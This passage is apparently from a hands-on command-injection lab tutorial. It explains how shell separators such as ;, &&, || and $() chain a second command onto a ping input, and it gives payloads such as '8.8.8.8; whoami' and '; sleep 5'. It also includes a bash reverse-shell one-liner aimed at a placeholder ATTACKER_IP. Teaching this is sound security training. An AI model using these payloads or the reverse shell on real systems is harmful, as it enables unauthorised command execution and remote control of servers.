Step 2 — your first real payload

Copy it. Paste it above. Watch a second command run.

A shell metacharacter is all it takes. The shell doesn't care that the developer only meant for you to supply a hostname — once your text reaches it, anything after a separator is just the next command to run.

8.8.8.8; whoami
; ends the ping command right there — valid or not — and tells the shell to start a brand-new command with whatever comes next. whoami never touches ping at all; it just runs, in the same shell, with the same privileges as the web server.

Step 3 — same idea, different shell

Separators aren't one-size-fits-all

The logic above — "end the intended command, start my own" — is universal. But which character does that job, and how output gets chained, changes between shells and operating systems. Trying the wrong one is the #1 reason an injection looks "blocked" when the app is simply running a different shell.

Separators & quirks by shell
; semicolon
Linux/macOS (bash/sh): runs next command no matter what the first one did.
&& AND
Runs next command only if the first one succeeded. Works on both bash and Windows cmd.
|| OR
Runs next command only if the first one failed — handy when you can't guess valid input.
| pipe
Feeds the first command's output into the next one — great for chaining, e.g. | whoami.
`cmd` / $(cmd)
Substitution — runs cmd first and splices its output into the middle of the original command.
& on Windows
cmd.exe's version of ;. PowerShell also accepts ; directly.

That's also why attackers fingerprint the target first — usually by sending a harmless delay command like ; sleep 5 and timing the response — before committing to a full payload.

Step 5 (bonus) — calling home: a reverse shell

When one command becomes a live, interactive session

A single injected command is a one-shot: run it, read the output, done. A reverse shell goes further — the injected command tells the victim server to open a connection back out to a machine the attacker controls, and hands that connection a live shell. Outbound connections are usually allowed even through firewalls that block inbound ones, which is exactly why attackers prefer this direction.

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Step 6 — why this is a big deal

It's never just "one weird command"

An injected whoami proves the shell ran your text. In a real attack, the same flaw usually means any command runs — read files, create admin accounts, install tools, pivot to other machines — all with whatever privileges the vulnerable process already has.
